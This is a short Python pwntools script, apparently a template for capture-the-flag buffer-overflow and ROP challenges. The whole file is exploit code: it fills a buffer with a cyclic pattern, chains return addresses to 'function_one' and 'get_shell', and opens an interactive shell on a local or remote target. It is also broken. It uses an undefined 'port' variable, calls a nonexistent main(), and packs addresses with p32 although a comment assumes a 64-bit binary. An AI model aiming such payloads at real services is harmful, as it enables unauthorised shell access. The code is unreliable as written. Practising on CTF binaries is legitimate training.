"""This script can be used as a ROPchain template, or any BoF-related challenge

Donn't forget to change the code for architecture, 32 or 64 bits files
"""

from pwn import *

# Size of the buffer to exploit
N = 28

# Test locally or remotely
is_remote = False

# URL, port for remote
(URL, PORT) = ("", 0)

# Binary file to exploit
BIN_FILE = "./"

# Assuming it's an ELF 64 bits
bin_file = ELF(BIN_FILE)

# Recieve binary input until
RECV_UNTIL = ">>> "

if is_remote:
    proc = remote(URL, port)
else:
    proc = process(bin_file.file.name)

# Get your symbols
func_1 = p32(bin_file.symbols["function_one"])
shell = p32(bin_file.symbols["get_shell"])

# Build your payload
payload = cyclic(N+4)
payload += func_1
payload += shell

# I/O of binary, send payload and get interactive
proc.recvuntil(RECV_UNTIL)
proc.sendline(payload)
proc.interactive()

if __name__ == "__main__":
    main()
